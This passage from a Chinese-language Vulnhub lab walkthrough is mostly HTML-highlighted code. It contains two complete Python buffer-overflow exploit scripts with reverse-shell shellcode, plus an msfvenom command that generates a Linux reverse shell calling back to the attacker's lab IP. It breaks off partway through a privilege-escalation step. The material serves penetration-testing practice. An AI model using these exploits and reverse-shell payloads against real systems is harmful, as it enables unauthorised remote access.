&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#34581777 \x77\x17\x58\x34&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#345964BA&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf = (&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xb8\xe6\xe1\x99\x27\xda\xcd\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x52\x31\x42\x12\x83\xc2\x04\x03\xa4\xef\x7b\xd2\xd4\x18\xf9&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x1d\x24\xd9\x9e\x94\xc1\xe8\x9e\xc3\x82\x5b\x2f\x87\xc6\x57&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xc4\xc5\xf2\xec\xa8\xc1\xf5\x45\x06\x34\x38\x55\x3b\x04\x5b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xd5\x46\x59\xbb\xe4\x88\xac\xba\x21\xf4\x5d\xee\xfa\x72\xf3&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x1e\x8e\xcf\xc8\x95\xdc\xde\x48\x4a\x94\xe1\x79\xdd\xae\xbb&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x59\xdc\x63\xb0\xd3\xc6\x60\xfd\xaa\x7d\x52\x89\x2c\x57\xaa&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x72\x82\x96\x02\x81\xda\xdf\xa5\x7a\xa9\x29\xd6\x07\xaa\xee&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xa4\xd3\x3f\xf4\x0f\x97\x98\xd0\xae\x74\x7e\x93\xbd\x31\xf4&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xfb\xa1\xc4\xd9\x70\xdd\x4d\xdc\x56\x57\x15\xfb\x72\x33\xcd&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x62\x23\x99\xa0\x9b\x33\x42\x1c\x3e\x38\x6f\x49\x33\x63\xf8&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xbe\x7e\x9b\xf8\xa8\x09\xe8\xca\x77\xa2\x66\x67\xff\x6c\x71&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x88\x2a\xc8\xed\x77\xd5\x29\x24\xbc\x81\x79\x5e\x15\xaa\x11&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x9e\x9a\x7f\xb5\xce\x34\xd0\x76\xbe\xf4\x80\x1e\xd4\xfa\xff&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x3f\xd7\xd0\x97\xaa\x22\xb3\x9d\x2a\x2e\x4c\xca\x28\x2e\x53&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xb6\xa4\xc8\x39\xd6\xe0\x43\xd6\x4f\xa9\x1f\x47\x8f\x67\x5a&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x47\x1b\x84\x9b\x06\xec\xe1\x8f\xff\x1c\xbc\xed\x56\x22\x6a&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x99\x35\xb1\xf1\x59\x33\xaa\xad\x0e\x14\x1c\xa4\xda\x88\x07&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x1e\xf8\x50\xd1\x59\xb8\x8e\x22\x67\x41\x42\x1e\x43\x51\x9a&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x9f\xcf\x05\x72\xf6\x99\xf3\x34\xa0\x6b\xad\xee\x1f\x22\x39&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x76\x6c\xf5\x3f\x77\xb9\x83\xdf\xc6\x14\xd2\xe0\xe7\xf0\xd2&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x99\x15\x61\x1c\x70\x9e\x81\xff\x50\xeb\x29\xa6\x31\x56\x34&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x59\xec\x95\x41\xda\x04\x66\xb6\xc2\x6d\x63\xf2\x44\x9e\x19&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x6b\x21\xa0\x8e\x8c\x60&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\x77\x17\x58\x34&lt;/span>&lt;span style="color:#cd5555">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nops = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x90&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">24&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + nops + buf + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/13.webp" alt="13">&lt;/p>
&lt;p>接收反弹成功&lt;/p>
&lt;h3 id="靶机测试">靶机测试&lt;/h3>
&lt;p>只修改IP，反弹shell成功后就断掉&lt;/p>
&lt;p>实际靶机是linux系统，需要重新生成shellcode&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ msfvenom -p linux/x86/shell_reverse_tcp &lt;span style="color:#00688b">LHOST&lt;/span>=10.0.2.15 &lt;span style="color:#00688b">LPORT&lt;/span>=&lt;span style="color:#b452cd">444&lt;/span> -f python -b &lt;span style="color:#cd5555">&amp;#34;\x00&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.7&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf = &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xba\x6e\x48\x71\x2c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\xa8\x4c\x93&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xd9\x05\x96\xa4\xc1\x36\x6b\x18\x6c\xba\xe2\x7f\xc0&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xdc\x39\xff\xb2\x79\x72\x3f\x78\xf9\x3b\x39\x7b\x91&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xb1\xb9\x79\x6e\xae\xbb\x7d\x71\x92\x35\x9c\xc1\x8c&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x15\x0e\x72\xe2\x95\x39\x95\xc9\x1a\x6b\x3d\xbc\x35&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xff\xd5\x28\x65\xd0\x47\xc0\xf0\xcd\xd5\x41\x8a\xf3&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x69\x6e\x41\x73&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\x77\x17\x58\x34&lt;/span>&lt;span style="color:#cd5555">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nops = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x90&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">24&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + nops + buf + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/14.webp" alt="14">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>发现根目录有个dawn-BETA.exe，开发web并下载&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/15.webp" alt="15">&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/16.webp" alt="16">&lt;/p>
&lt;p>运行dawn-BETA.exe发现&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cmd" data-lang="cmd">&lt;span style="display:flex;">&lt;span>C:\Users\John&lt;span style="color:#228b22">&amp;gt;tasklist|findstr dawn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dawn-BETA.exe 3764 Console 1 2,088 Ks
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>C:\Users\John&lt;span style="color:#228b22">&amp;gt;netstat -ano|findstr 3764&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TCP 0.0.0.0:1435 0.0.0.0:0 LISTENING 3764
